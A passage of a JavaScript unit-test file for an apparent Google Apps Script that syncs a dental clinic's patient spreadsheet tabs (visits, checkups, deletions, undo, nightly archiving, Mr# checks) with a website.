  assert.ok(after - before >= 5000, `${before} -> ${after}`);
});

test('the script is pure ASCII (symbols are written as \\u escapes), so pasting it cannot garble anything', () => {
  const src = fs.readFileSync(SCRIPT_PATH, 'utf8');
  const bad = [...src].filter((c) => c.charCodeAt(0) > 126 || (c.charCodeAt(0) < 32 && c !== '\n'));
  assert.equal(bad.length, 0, 'non-ASCII or control characters: ' + bad.map((c) => c.charCodeAt(0).toString(16)).join(' '));
  assert.ok(!src.includes('\r'), 'LF line ends');
  // Google takes much larger script files (whole libraries are pasted into projects); this bound only stops the file growing unnoticed. Raised
  // from 150 to 180 KB in round 12 (the table code, RS12-3)
  assert.ok(src.length < 180 * 1024, 'size ' + src.length);
});

test('another person who can edit the sheet and presses "Sync now" is told it is Dr. Ali\'s job; no header is overwritten, nothing is sent', () => {
  const { env, server } = synced();
  const header = headerOf(env, GUL);
  env.props.user.delete('AAJ_SYNC_SECRET');             // their own account has no secret
  env.responder = () => 'OK';
  const calls = server.calls.length;
  env.ctx.aajSyncNow();
  assert.match(env.dialogs[env.dialogs.length - 1].text, /Only Dr\. Ali's account can start it by hand\./);
  assert.equal(server.calls.length, calls);
  assert.equal(headerOf(env, GUL), header);
});

test('an empty tab at midnight just rolls over: no archive lines, no error, the new day starts', () => {
  const { env, server } = world({ patients: [], rows: { [GUL]: [] } });
  env.ticks(5);
  env.at(NEXT, '00:05');
  env.ticks(1);
  assert.equal(env.props.document.get('listDate:' + GUL), NEXT);
  assert.equal(env.archiveBooks().length, 0, 'nothing to archive: no spreadsheet made');
  assert.match(headerOf(env, GUL), /new list for 2026-10-10/);
  assert.equal(server.state.visits.length, 0);
});

test('all five tabs in one go: each tab\'s own header variant is used (NN\'s Column 13/14/16 stay untouched, DHA\'s group is "Column 13"), one call carries all five', () => {
  const { env, server } = world({ tabs: TABS, patients: ALL_PATIENTS });
  const nn = env.tab('North Nazimabad');
  nn._set(2, 14, { kind: 's', v: 'keep me' }); nn._set(2, 15, { kind: 's', v: 'and me' }); nn._set(2, 16, { kind: 's', v: 'me too' });
  settle(env, 3);
  const first = server.calls.find((c) => c.payload.tabs.some((t) => t.rows.length));
  assert.equal(first.payload.tabs.length, 5, 'one call, all five tabs (the quota)');
  assert.deepEqual(first.payload.tabs.map((t) => t.branch), ['GUL', 'NN', 'DHA', 'LHR', 'ISB']);
  assert.deepEqual([nn.text(2, 14), nn.text(2, 15), nn.text(2, 16)], ['keep me', 'and me', 'me too'], 'columns the sync does not know are left alone');
  assert.equal(webVisit(server, 'Sample Person Nine').group, 1, 'DHA: "Column 13" is the group');
  server.editVisit(webVisit(server, 'Sample Person Nine').id, { group: 3 });
  server.editVisit(webVisit(server, 'Sample Person Seven').id, { token: 9 });
  env.ticks(1);
  assert.equal(env.tab('DHA KHI').text(2, 7), 'Group 3', 'written into the column called "Column 13"');
  assert.equal(nn.text(2, colOf(env, 'North Nazimabad', 'token')), '9', 'NN: "Token No"');
  assert.equal(nn.text(2, 14), 'keep me');
  // Lahore and Islamabad say "Status" and "Token #"
  server.editVisit(webVisit(server, 'Sample Person Eleven').id, { status: 'cancelled' });
  env.ticks(1);
  assert.equal(env.tab('Gulberg Lhr').text(2, colOf(env, 'Gulberg Lhr', 'status')), 'Cancelled');
  for (const t of TABS) assert.match(headerOf(env, t), /^Website \u00b7 \d\d:\d\d( \u00b7 \d+ need attention|\s\u2713)$/);
});

test('when nothing changed anywhere the website answers "unchanged" and sends no list: a quiet minute is one small call', () => {
  const { env, server } = synced();
  env.ticks(2);
  const body = JSON.parse(server.calls[server.calls.length - 1].response.body);
  assert.equal(body.tabs[0].unchanged, true);
  assert.equal(body.tabs[0].visits, undefined);
  assert.ok(server.calls[server.calls.length - 1].response.body.length < 400);
  // a website change makes the hash differ: the list comes back
  server.editVisit(webVisit(server, 'Sample Person One').id, { details: 'new' });
  env.ticks(1);
  const body2 = JSON.parse(server.calls[server.calls.length - 1].response.body);
  assert.equal(body2.tabs[0].unchanged, false);
  assert.ok(Array.isArray(body2.tabs[0].visits));
});

test('a secret put in Project Settings > Script Properties is NOT used: every editor of the sheet can read those', () => {
  const { env, server } = world({ patients: BASE_PATIENTS });
  env.props.user.delete('AAJ_SYNC_SECRET');
  env.props.script.set('AAJ_SYNC_SECRET', SECRET);
  settle(env, 3);
  assert.equal(server.calls.length, 0, 'nothing is sent');
  assert.match(headerOf(env, GUL), /not set up/);
  assert.equal(env.stats.fetches, 0);
});

test('the website is down at midnight: nothing is cleared (the last rows have not reached it); the archive keeps trying until 02:30, then goes ahead and copies anyway', () => {
  const { env, server } = dayEnd();
  env.responder = () => 'OK';
  env.typeRow(GUL, 9, ['', 'Typed At Midnight', '', 'Checkup', '', 'Waiting', '', '', '', '', '', '03001110977', '']);
  server.faults.down = 1000;
  env.at(NEXT, '00:31');
  env.ticks(3);
  assert.equal(env.archiveBooks().length, 0, 'not archived while the last sync fails');
  assert.equal(rowOf(env, GUL, 'Typed At Midnight'), 9, 'and the rows are still on the sheet');
  assert.equal(env.props.document.get('listDate:' + GUL), TODAY);
  assert.equal(env.tab('Aaj Sync log').values().filter((r) => /did not go through/.test(r[3])).length, 1, 'said once');
  // the website comes back at 01:10
  server.faults.down = 0;
  env.at(NEXT, '01:10');
  env.ticks(1);
  assert.equal(server.checkupsOf('GUL', TODAY).length, 1, 'the last-minute checkup reached the website for the old day');
  assert.ok(archiveSheet(env).values().some((r) => r[2] === 'Typed At Midnight'));
  assert.equal(env.props.document.get('listDate:' + GUL), NEXT);
  // a website that stays down past 02:30: the rows are copied anyway (they are in the archive and can be imported from there)
  const w = dayEnd();
  w.server.faults.down = 1000;
  w.env.at(NEXT, '02:31');
  w.env.ticks(1);
  assert.equal(archiveSheet(w.env).used().rows, 8);
  assert.equal(w.env.props.document.get('listDate:' + GUL), NEXT);
});

// ------------------------------------------------------------------------------------------------ checkup patients (rows with no Mr#)
const CHECKUP_ROWS = [
  ['', 'Check One', '', 'Checkup', '', 'Waiting', '', 'Dr Haniya', 'scaling advised', '', '', '03001110301', ''],
  ['', 'check two lhr', '', 'Consultation checkup', 'Kit 55k', 'Treatment', '', '', '', '', '', '', ''],
];
function ckWorld(extra = {}) {
  const w = world({ rows: { [GUL]: CHECKUP_ROWS }, patients: BASE_PATIENTS, ...extra });
  settle(w.env, 3);
  return w;
}

test('a checkup row can be renamed or edited in the sheet: it stays the same checkup (not a new row), the website follows', () => {
  const { env, server } = ckWorld();
  const c = server.state.checkups.find((x) => x.name === 'Check One');
  const key = c.sheet_key;
  setCell(env, GUL, 2, 'patient', 'Check Onay');       // the surname corrected, the same phone: the same checkup
  setCell(env, GUL, 2, 'treatment', 'Scaling');
  env.tickAfter(5000);
  assert.equal(c.name, 'Check One', 'a name being typed (edited a moment ago) is not sent yet');
  env.advance(61000);
  env.ticks(2);
  assert.equal(server.state.checkups.length, 2, 'no second checkup');
  assert.equal(c.name, 'Check Onay');
  assert.equal(c.checkup_for, 'Scaling');
  assert.equal(c.sheet_key, key);
  assert.equal(statusOf(env, GUL, 2), '\u2713 On website');
  quiet(env, server);
});

test('a checkup edited on the website shows in its row; an Mr# the website gives it (registered as a patient) is written into the Mr# cell', () => {
  const { env, server } = ckWorld();
  const c = server.state.checkups.find((x) => x.name === 'Check One');
  server.editCheckup(c.id, { details: 'web details', day_status: 'completed' });
  env.ticks(1);
  assert.equal(cellOf(env, GUL, 2, 'treatment details'), 'web details');
  assert.equal(cellOf(env, GUL, 2, 'waiting'), 'Completed');
  assert.equal(cellOf(env, GUL, 2, 'mr'), '');
  // the person is registered as a patient on the website: the new Mr# comes back
  server.addPatient({ mr: '50001', name: 'Check One', phone: '03001110301' });
  server.editCheckup(c.id, { patient_mr: '50001' });
  env.ticks(1);
  assert.equal(cellOf(env, GUL, 2, 'mr'), '50001', 'the new Mr# is written into the sheet row');
  assert.equal(env.tab(GUL).kind(2, 1), 'n');
  quiet(env, server);
  assert.equal(server.state.checkups.length, 2, 'still a checkup row: nothing was re-sent as a new patient');
  assert.equal(server.state.visits.length, 0);
  setCell(env, GUL, 2, 'treatment details', 'sheet again');
  env.tickAfter(5000);
  assert.equal(c.details, 'sheet again', 'and the row still follows the checkup');
});

test('RS5-E1 (was B4): an Mr# typed later into a checkup row (an existing patient on recall, the Mr# looked up in Healthwire) makes the patient\'s visit: the row lets go of the checkup, the untouched checkup is removed like a deleted row, and the patient is no lead at night', () => {
  const { env, server } = ckWorld();
  const c = server.state.checkups.find((x) => x.name === 'Check One');
  server.addPatient({ mr: '9810', name: 'Check One', phone: '03001110301' });
  setCell(env, GUL, 2, 'mr', '9810');
  env.advance(61000);
  env.ticks(3);
  assert.equal(server.state.visits.length, 1, 'a row with an Mr# is a patient\'s visit (owner rule)');
  const v = server.state.visits[0];
  assert.equal(v.mr, '9810');
  assert.equal(server.checkupById(c.id), undefined, 'the untouched checkup went like a deleted row (nothing hung on it)');
  assert.equal(cellOf(env, GUL, 2, 'sync key'), v.sheet_key, "the row is the patient's visit now");
  assert.equal(statusOf(env, GUL, 2), '✓ On website');
  assert.equal(env.tab(GUL).used().rows, 3, 'no row was added');
  quiet(env, server);
  env.at(TODAY, '23:58'); env.ticks(1);
  env.at(NEXT, '00:05'); env.ticks(1);
  assert.deepEqual(ckSheet(env).values().slice(1).map((r) => r[1]), ['Check Two'], 'only the real checkup patient is on the nightly list');
});

test('RS5-E1: an Mr# typed into a checkup row that has follow-up notes: the visit is made, the checkup is kept and comes back as its own row', () => {
  const { env, server } = ckWorld();
  const c = server.state.checkups.find((x) => x.name === 'Check One');
  server.editCheckup(c.id, { follow_up: 'Interested' });
  env.ticks(1);
  server.addPatient({ mr: '9810', name: 'Check One', phone: '03001110301' });
  setCell(env, GUL, 2, 'mr', '9810');
  env.advance(61000);
  env.ticks(4);
  assert.deepEqual(server.state.visits.map((v) => v.mr), ['9810']);
  assert.equal(server.checkupById(c.id), c, 'the checkup with follow-up notes stays');
  const back = [...Array(6).keys()].map((i) => i + 3).find((r) => cellOf(env, GUL, r, 'sync key') === c.sheet_key);
  assert.ok(back, "the checkup's row came back below");
  assert.match(statusOf(env, GUL, back), /^⚠ Not removed: this checkup is already a patient, or has follow-up notes/);
});

test('another person typed over a checkup row together with their own Mr# (another name and phone) is a patient row: the patient gets the visit, the checkup goes with its old key', () => {
  const { env, server } = ckWorld();
  server.addPatient({ mr: '9810', name: 'Rehan Typed', phone: '03001119810' });
  setCell(env, GUL, 2, 'mr', '9810');
  setCell(env, GUL, 2, 'patient', 'Rehan Typed');
  setCell(env, GUL, 2, 'contact', '03001119810');
  env.advance(61000);
  env.ticks(3);
  assert.equal(server.state.visits.length, 1);
  assert.equal(server.state.visits[0].mr, '9810');
  assert.equal(server.state.checkups.filter((x) => x.name === 'Check One').length, 0, 'the checkup of the old person went with the old key (nothing hangs on it)');
  assert.equal(statusOf(env, GUL, 2), '✓ On website');
});

test('a checkup made on the website is added to the sheet as a row without an Mr#, claimed once, and follows later edits', () => {
  const { env, server } = ckWorld();
  const c = server.addCheckup({ branch: 'GUL', date: TODAY, name: 'Web Checkup', phone: '03001110302', checkup_for: 'Checkup', doctors: 'Dr Ali Rashid' });
  env.ticks(2);
  const r = rowOf(env, GUL, 'Web Checkup');
  assert.equal(r, 4, 'right below the last patient row');
  assert.equal(cellOf(env, GUL, r, 'mr'), '');
  assert.equal(env.tab(GUL).kind(r, colOf(env, GUL, 'contact')), 's');
  assert.equal(cellOf(env, GUL, r, 'contact'), '03001110302');
  assert.equal(cellOf(env, GUL, r, 'waiting'), 'Waiting');
  assert.equal(statusOf(env, GUL, r), '\u2713 Added from the website');
  env.ticks(3);
  assert.equal(env.tab(GUL).used().rows, 4, 'added once');
  assert.equal(c.sheet_key, 'W-' + c.id, 'the website claimed it');
  server.editCheckup(c.id, { checkup_for: 'Whitening' });
  env.ticks(2);
  assert.equal(cellOf(env, GUL, r, 'treatment'), 'Whitening');
  setCell(env, GUL, r, 'treatment details', 'from the sheet');
  env.tickAfter(5000);
  assert.equal(c.details, 'from the sheet');
  setCell(env, GUL, r, 'patient', 'Web Checkups');       // renamed in the sheet (the same first name): the same checkup, not a new row
  settle(env, 2);
  assert.equal(c.name, 'Web Checkups');
  assert.equal(server.state.checkups.length, 3, 'no fourth checkup');
  assert.equal(c.sheet_key, 'W-' + c.id);
  quiet(env, server);
});

test('a checkup row that has just come from the website is renamed in the sheet before the next look: still the same checkup, not a new row', () => {
  const { env, server } = ckWorld();
  const c = server.addCheckup({ branch: 'GUL', date: TODAY, name: 'Web Two', phone: '03001110303', checkup_for: 'Checkup' });
  env.ticks(1);
  const r = rowOf(env, GUL, 'Web Two');
  assert.equal(statusOf(env, GUL, r), '✓ Added from the website');
  setCell(env, GUL, r, 'patient', 'Web Too');
  settle(env, 2);
  assert.equal(c.name, 'Web Too');
  assert.equal(server.state.checkups.length, 3, 'no new checkup was made for the renamed row');
  assert.equal(c.sheet_key, 'W-' + c.id);
});

test('deleting a checkup row removes the checkup from the website; Ctrl+Z brings it back; a checkup that is already a patient is kept and put back', () => {
  const rows = [];
  for (let i = 0; i < 6; i++) rows.push(['', 'Check ' + (i + 1), '', 'Checkup', '', 'Waiting', '', '', '', '', '', '0300222000' + i, '']);
  const { env, server } = world({ rows: { [GUL]: rows } });
  settle(env, 3);
  assert.equal(server.state.checkups.length, 6);
  const sh = env.tab(GUL);
  const saved = []; for (let c = 1; c <= sh.used().cols; c++) saved.push(sh._get(2, c));
  env.deleteRows(GUL, 2);
  env.ticks(2);
  assert.equal(server.state.checkups.length, 5, 'Check 1 is gone from the website too');
  assert.match(env.tab('Aaj Sync log').values().map((r) => r.join(' ')).join('\n'), /Check 1 .*the checkup is removed from the website too/);
  // Ctrl+Z
  for (let rr = sh.used().rows; rr >= 2; rr--) for (let c = 1; c <= saved.length; c++) { sh._set(rr + 1, c, sh._get(rr, c)); sh._set(rr, c, null); }
  saved.forEach((cell, i) => { if (cell) sh._set(2, i + 1, cell); });
  env.touch();
  env.ticks(2);
  assert.equal(server.state.checkups.length, 6);
  assert.equal(server.state.checkups.find((x) => x.name === 'Check 1').sheet_key, sh.text(2, colOf(env, GUL, 'sync key')));
  // a registered checkup is kept
  server.addPatient({ mr: '50002', name: 'Check 2', phone: '03002220001' });
  server.editCheckup(server.state.checkups.find((x) => x.name === 'Check 2').id, { patient_mr: '50002' });
  env.ticks(1);
  env.deleteRows(GUL, rowOf(env, GUL, 'Check 2'));
  env.ticks(2);
  assert.equal(server.state.checkups.length, 6, 'kept');
  const back = [...Array(10).keys()].map((i) => i + 2).find((r) => cellOf(env, GUL, r, 'patient') === 'Check 2');
  assert.ok(back, 'the row is back');
  assert.match(statusOf(env, GUL, back), /^\u26a0 Not removed: this checkup is already a patient/);
});

// ------------------------------------------------------------------------------------------------ rows deleted, kept by the website
test('a deleted row of a visit that has an invoice: the website keeps it marked Cancelled, and the row comes back showing Cancelled and why', () => {
  const { env, server } = synced();
  const v = webVisit(server, 'Sample Person Three');
  v.attached = true;
  env.deleteRows(GUL, rowOf(env, GUL, 'Sample Person Three'));
  env.ticks(2);
  assert.equal(v.status, 'cancelled');
  assert.equal(server.visitById(v.id), v, 'not deleted');
  const back = rowOf(env, GUL, 'Sample Person Three');
  assert.ok(back > 5, 'the row returns');
  assert.equal(cellOf(env, GUL, back, 'waiting'), 'Cancelled');
  assert.equal(statusOf(env, GUL, back), '\u26a0 Kept on the website and marked Cancelled: it has an attached record (invoices).');
  assert.match(env.tab('Aaj Sync log').values().map((r) => r.join(' ')).join('\n'), /Sample Person Three .*Kept on the website and marked Cancelled/);
  quiet(env, server);
  env.ticks(2);
  assert.equal(server.state.visits.filter((x) => x.mr === '9702').length, 1, 'once');
});

// ------------------------------------------------------------------------------------------------ Ctrl+Z after the sync put rows back (RV-1, RV-3); kept checkups (RV-2)
/** the cells of rows r .. r+n-1 as they are now (the hidden columns too), for a Ctrl+Z later */
function saveRows(sh, r, n = 1) {
  const width = sh.used().cols, out = [];
  for (let i = 0; i < n; i++) { const row = []; for (let c = 1; c <= width; c++) row.push(sh._get(r + i, c)); out.push(row); }
  return out;
}
/** Ctrl+Z of a row deletion: the saved rows are back at row `at` with their hidden cells; everything from there down moves down */
function undoDelete(env, tab, at, saved) {
  const sh = env.tab(tab), n = saved.length, width = Math.max(sh.used().cols, saved[0].length);
  sh.insertRowsAfter(sh.getMaxRows(), n);
  for (let rr = sh.used().rows; rr >= at; rr--) for (let c = 1; c <= width; c++) { sh._set(rr + n, c, sh._get(rr, c)); sh._set(rr, c, null); }
  saved.forEach((row, i) => row.forEach((cell, j) => { if (cell) sh._set(at + i, j + 1, cell); }));
  env.ctx.aajOnChange({ changeType: 'INSERT_ROW', source: env.book });
}
/** the rows whose patient name is exactly this, top to bottom */
function rowsNamed(env, tab, name) {
  const sh = env.tab(tab), nc = colOf(env, tab, 'patient'), out = [];
  for (let r = 2; r <= sh.used().rows; r++) if (sh.text(r, nc) === name) out.push(r);
  return out;
}
/** the rows the script sent to the website since call number `from` */
function sentRowsSince(server, from) { return server.calls.slice(from).flatMap((c) => (c.payload.tabs || []).flatMap((t) => t.rows || [])); }

test('RV-1: Ctrl+Z after the sync has put back a held deletion: the copies it appended say "Duplicate of row N", are not sent, and no checkup is made twice', () => {
  const ph = (i) => '0302100000' + i;
  const rows = [
    ['9861', 'Rv Alpha', '', 'Scaling', '', 'Waiting', '', '', '', '', '', ph(1), ''],
    ['9862', 'Rv Bravo', '', 'Scaling', '', 'Waiting', '', '', '', '', '', ph(2), ''],
    ['', 'Ck Echo', '', 'Checkup', '', 'Waiting', '', '', '', '', '', ph(5), ''],
    ['', 'Ck Foxtrot', '', 'Checkup', '', 'Waiting', '', '', '', '', '', ph(6), ''],
    ['9863', 'Rv Charlie', '', 'Scaling', '', 'Waiting', '', '', '', '', '', ph(3), ''],
    ['9864', 'Rv Delta', '', 'Scaling', '', 'Waiting', '', '', '', '', '', ph(4), ''],
  ];
  const patients = [1, 2, 3, 4].map((i) => ({ mr: String(9860 + i), name: 'Rv ' + ['Alpha', 'Bravo', 'Charlie', 'Delta'][i - 1], phone: ph(i) }));
  const { env, server } = world({ rows: { [GUL]: rows }, patients });
  settle(env, 3);
  assert.equal(server.state.visits.length, 4);
  assert.equal(server.state.checkups.length, 2);
  const sh = env.tab(GUL);
  const saved = saveRows(sh, 3, 4);                           // Rv Bravo, Ck Echo, Ck Foxtrot, Rv Charlie
  env.deleteRows(GUL, 3, 4);
  env.ticks(2);
  assert.equal(server.state.visits.length, 4, 'held: nothing removed');
  assert.equal(server.state.checkups.length, 2);
  assert.match(statusOf(env, GUL, exactRow(env, GUL, 'Ck Echo')), /^⚠ Needs attention: 4 rows disappeared at once/);
  // Ctrl+Z: the four rows are back at their place with their hidden keys; the rows the sync put back stay at the bottom
  undoDelete(env, GUL, 3, saved);
  const from = server.calls.length;
  env.advance(61000);
  env.ticks(3);
  assert.equal(server.state.checkups.length, 2, 'no checkup made twice');
  assert.equal(server.state.visits.length, 4);
  assert.equal(sentRowsSince(server, from).length, 0, 'nothing is sent for the copies');
  for (const name of ['Rv Bravo', 'Ck Echo', 'Ck Foxtrot', 'Rv Charlie']) {
    const at = rowsNamed(env, GUL, name);
    assert.equal(at.length, 2, name + ' is on the sheet twice');
    assert.equal(statusOf(env, GUL, at[1]), `✗ Duplicate of row ${at[0]}: delete this row.`, name);
    assert.ok(statusOf(env, GUL, at[0]).startsWith('✓'), name + ': ' + statusOf(env, GUL, at[0]));
    assert.equal(sh.text(at[1], colOf(env, GUL, 'sync key')), sh.text(at[0], colOf(env, GUL, 'sync key')), 'the copy keeps the key (never a new row)');
  }
  assert.match(headerOf(env, GUL), /4 need attention/);
  // staff delete the four copies together: nothing is removed from the website, nothing comes back
  env.deleteRows(GUL, rowsNamed(env, GUL, 'Rv Bravo')[1], 4);
  env.ticks(3);
  assert.equal(server.state.visits.length, 4);
  assert.equal(server.state.checkups.length, 2);
  for (const name of ['Rv Alpha', 'Rv Bravo', 'Ck Echo', 'Ck Foxtrot', 'Rv Charlie', 'Rv Delta']) assert.equal(rowsNamed(env, GUL, name).length, 1, name + ' once');
  assert.ok(server.state.visits.every((v) => v.status === 'waiting'));
  quiet(env, server);
});

test('RV-1: a pure copy of a checkup row deleted later, or the original deleted instead, keeps the one checkup', () => {
  const rows = [];
  for (let i = 0; i < 6; i++) rows.push(['', 'Ck Copy ' + (i + 1), '', 'Checkup', '', 'Waiting', '', '', '', '', '', '0302200000' + i, '']);
  const { env, server } = world({ rows: { [GUL]: rows } });
  settle(env, 3);
  assert.equal(server.state.checkups.length, 6);
  const sh = env.tab(GUL);
  const copy = saveRows(sh, 2, 1)[0];
  copy.forEach((cell, j) => { if (cell) sh._set(9, j + 1, cell); });       // a whole row copied (hidden cells too) below the list
  env.touch();
  env.advance(61000);
  env.ticks(2);
  assert.equal(server.state.checkups.length, 6, 'no second checkup');
  assert.equal(statusOf(env, GUL, 9), '✗ Duplicate of row 2: delete this row.');
  env.deleteRows(GUL, 2);                                     // the ORIGINAL is deleted: the copy is the row now
  env.ticks(3);
  assert.equal(server.state.checkups.length, 6, 'the checkup stays');
  const r = exactRow(env, GUL, 'Ck Copy 1');
  assert.equal(server.state.checkups.find((c) => c.name === 'Ck Copy 1').sheet_key, sh.text(r, colOf(env, GUL, 'sync key')));
});

test('RV-2: deleting the row of a Completed or Treatment checkup keeps the checkup (doctor, details), and its row comes back with the reason', () => {
  const rows = [['', 'Ck Done', '', 'Checkup', '', 'Completed', '', 'Dr Ali Rashid', 'needs braces, quoted 80k', '', '', '03023000001', ''],
    ['', 'Ck Treat', '', 'Checkup', '', 'Treatment', '', '', '', '', '', '03023000002', '']];
  for (let i = 0; i < 6; i++) rows.push(['', 'Ck Plain ' + (i + 1), '', 'Checkup', '', 'Waiting', '', '', '', '', '', '0302300010' + i, '']);
  const { env, server } = world({ rows: { [GUL]: rows } });
  settle(env, 3);
  const done = server.state.checkups.find((c) => c.name === 'Ck Done');
  assert.equal(done.day_status, 'completed');
  const sh = env.tab(GUL);
  const savedDone = saveRows(sh, rowOf(env, GUL, 'Ck Done'), 1);
  env.deleteRows(GUL, rowOf(env, GUL, 'Ck Done'));
  env.ticks(2);
  assert.ok(server.checkupById(done.id), 'kept on the website');
  assert.equal(done.doctors, 'Dr Ali Rashid');
  assert.equal(done.details, 'needs braces, quoted 80k');
  const back = exactRow(env, GUL, 'Ck Done');
  assert.ok(back > 8, 'its row is back at the bottom');
  assert.equal(statusOf(env, GUL, back), '⚠ Not removed: this checkup is Completed on the website. To take a patient off, set Status to Cancelled.');
  // Ctrl+Z after the row came back (loop-1 deferred N4): the checkup is not made twice; the row put back says it is a duplicate
  undoDelete(env, GUL, 2, savedDone);
  env.advance(61000);
  env.ticks(2);
  assert.equal(server.state.checkups.filter((c) => c.name === 'Ck Done').length, 1, 'one checkup');
  assert.deepEqual(rowsNamed(env, GUL, 'Ck Done').map((r) => statusOf(env, GUL, r).charAt(0)), ['✓', '✗']);
  env.deleteRows(GUL, rowsNamed(env, GUL, 'Ck Done')[1]);
  env.ticks(2);
  assert.equal(server.state.checkups.filter((c) => c.name === 'Ck Done').length, 1);
  env.deleteRows(GUL, rowOf(env, GUL, 'Ck Treat'));
  env.ticks(2);
  assert.ok(server.state.checkups.find((c) => c.name === 'Ck Treat'), 'a checkup in Treatment is kept too');
  assert.equal(statusOf(env, GUL, exactRow(env, GUL, 'Ck Treat')), '⚠ Not removed: this checkup is Treatment on the website. To take a patient off, set Status to Cancelled.');
  env.deleteRows(GUL, rowOf(env, GUL, 'Ck Plain 1'));
  env.ticks(2);
  assert.equal(server.state.checkups.find((c) => c.name === 'Ck Plain 1'), undefined, 'a Waiting checkup with nothing on it still goes with its row');
});

test('RV-3: Ctrl+Z after the row of a kept-and-Cancelled visit came back: the visit is Waiting again and the copy says "Duplicate of row N"', () => {
  const { env, server } = synced();
  const v = webVisit(server, 'Sample Person Three');
  v.attached = true;
  const sh = env.tab(GUL);
  const r3 = rowOf(env, GUL, 'Sample Person Three');
  const saved = saveRows(sh, r3, 1);
  env.deleteRows(GUL, r3);
  env.ticks(2);
  assert.equal(v.status, 'cancelled');
  assert.equal(statusOf(env, GUL, exactRow(env, GUL, 'Sample Person Three')), '⚠ Kept on the website and marked Cancelled: it has an attached record (invoices).');
  undoDelete(env, GUL, r3, saved);
  env.ticks(2);
  assert.equal(v.status, 'waiting', 'the visit has its status back');
  assert.equal(server.state.visits.filter((x) => x.mr === '9702').length, 1);
  const at = rowsNamed(env, GUL, 'Sample Person Three');
  assert.deepEqual([at.length, at[0]], [2, r3]);
  assert.equal(cellOf(env, GUL, r3, 'waiting'), 'Waiting');
  assert.equal(statusOf(env, GUL, r3), '✓ On website');
  assert.equal(statusOf(env, GUL, at[1]), `✗ Duplicate of row ${r3}: delete this row.`);
  env.deleteRows(GUL, at[1]);                                 // staff delete the copy
  env.ticks(2);
  assert.equal(v.status, 'waiting');
  assert.equal(server.visitById(v.id), v, 'nothing removed');
  assert.equal(rowsNamed(env, GUL, 'Sample Person Three').length, 1);
  quiet(env, server);
});

test('RV-3: the row the sync put back itself (no Ctrl+Z) leaves the kept visit Cancelled', () => {
  const { env, server } = synced();
  const v = webVisit(server, 'Sample Person Three');
  v.attached = true;
  env.deleteRows(GUL, rowOf(env, GUL, 'Sample Person Three'));
  env.ticks(4);
  assert.equal(v.status, 'cancelled');
  assert.equal(rowsNamed(env, GUL, 'Sample Person Three').length, 1);
  quiet(env, server);
});

test('a row deleted by a person while the sheet is being archived at night is never a removal: the nightly clear removes nothing from the website', () => {
  const { env, server } = dayEnd();
  const before = server.state.visits.length;
  env.at(NEXT, '00:05');
  env.ticks(1);                                     // final flush, copy, clear
  assert.equal(dataCells(env).length, 0);
  env.at(NEXT, '08:00');
  env.ticks(4);
  assert.equal(server.visitsOf('GUL', TODAY).length, before, 'yesterday\'s visits are all still on the website');
  assert.equal(server.state.visits.length, before);
  assert.ok(server.calls.every((c) => c.payload.date !== NEXT || c.payload.tabs.every((t) => (t.present || []).length === 0 && t.rows.length === 0)), 'the new day started with nothing to remove');
  assert.equal(server.calls.filter((c) => c.payload.date === TODAY && c.at >= Date.parse(NEXT + 'T00:00:00Z') - 5 * 3600000).every((c) => c.payload.check_removed === false), true, 'the last flush before the clear asks for no removal check');
});

// ------------------------------------------------------------------------------------------------ Mr# the website does not know
test('an Mr# the website does not know: below 50000 it is a Healthwire number (the patient is added, the row says to check it); 50000 and above is a typo (nothing is made)', () => {
  const rows = [
    ['9851', 'Kaneez Fatima', '', 'RCT', '', 'Waiting', '', '', '', '', '', '03001110851', ''],
    ['50123', 'Typo Person', '', 'RCT', '', 'Waiting', '', '', '', '', '', '03001110852', ''],
    ['49999', 'Edge Person', '', 'RCT', '', 'Waiting', '', '', '', '', '', '03001110853', ''],
  ];
  const { env, server } = world({ rows: { [GUL]: rows } });
  settle(env, 3);
  assert.deepEqual(server.state.patients.map((p) => p.mr), ['9851', '49999'], 'Healthwire numbers become patients with that Mr#');
  assert.equal(statusOf(env, GUL, 2), '\u26a0 New patient added with Healthwire Mr# 9851. Check the name and phone on the website.');
  assert.equal(statusOf(env, GUL, 3), '\u2717 Mr# 50123 is not on the website. Check the number.');
  assert.match(env.tab('Aaj Sync log').values().map((r) => r.join(' ')).join('\n'), /Kaneez Fatima .*New patient added: Mr# 9851/);
  assert.equal(server.state.visits.length, 2);
  assert.match(headerOf(env, GUL), /3 need attention/, 'two new patients to check, one typo');
});

test('M2 (loop 6): a retired Mr# (the website\'s 10003, now 50003) typed with that patient\'s name says to use 50003 and makes nothing; with another name it is Healthwire\'s new patient', () => {
  const rows = [
    ['10903', 'Renum Sample', '', 'Monthly', '4', 'Waiting', '', '', '', '', '', '', ''],
    ['10904', 'Kashif Newcomer', '', 'RCT', '', 'Waiting', '', '', '', '', '', '', ''],
  ];
  const patients = [
    { mr: '50903', name: 'Renum Sample', notes: 'Mr# was 10903 until 09 Oct 2026 (the website now numbers from 50000)' },
    { mr: '50904', name: 'Renum Other', notes: 'Mr# was 10904 until 09 Oct 2026 (the website now numbers from 50000)' },
  ];
  const { env, server } = world({ rows: { [GUL]: rows }, patients });
  settle(env, 3);
  assert.equal(statusOf(env, GUL, 2), "✗ Mr# 10903 is no longer used. This patient's Mr# is now 50903. Use 50903.");
  assert.equal(statusOf(env, GUL, 3), '⚠ New patient added with Healthwire Mr# 10904. Check the name and phone on the website.');
  assert.deepEqual(server.state.patients.map((p) => p.mr), ['50903', '50904', '10904'], 'no second file under the old number; Healthwire\'s own 10904 is made');
  assert.equal(server.state.visits.length, 1, 'only the Healthwire patient has a visit');
  setCell(env, GUL, 2, 'mr', '50903');       // staff follow the message
  env.advance(61000);
  env.ticks(3);
  assert.equal(statusOf(env, GUL, 2), '✓ On website');
  assert.equal(server.state.visits.length, 2);
  assert.equal(server.state.visits[1].mr, '50903', 'the visit is on the patient\'s file');
});

test('another patient\'s name is not given away when an Mr# does not fit: the row only says the name does not match that Mr#', () => {
  const rows = [['9701', 'Totally Different', '', 'RCT', '', 'Waiting', '', '', '', '', '', '', '']];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: [{ mr: '9701', name: 'Sample Person One', phone: '03001110001', first_branch: 'DHA' }] });
  settle(env, 3);
  assert.equal(statusOf(env, GUL, 2), "\u2717 Needs attention: the name in this row does not match Mr# 9701 on the website. Check the Mr#, or type the name as the website has it.");
  assert.ok(!/Sample|Person One/.test(statusOf(env, GUL, 2)));
  assert.equal(server.state.visits.length, 0);
});

// ------------------------------------------------------------------------------------------------ quiet minutes
test('a quiet minute is one question to the website and reads no sheet; after something was typed the next minute reads in full, then it is quiet again', () => {
  const { env, server } = synced();
  env.ticks(1);
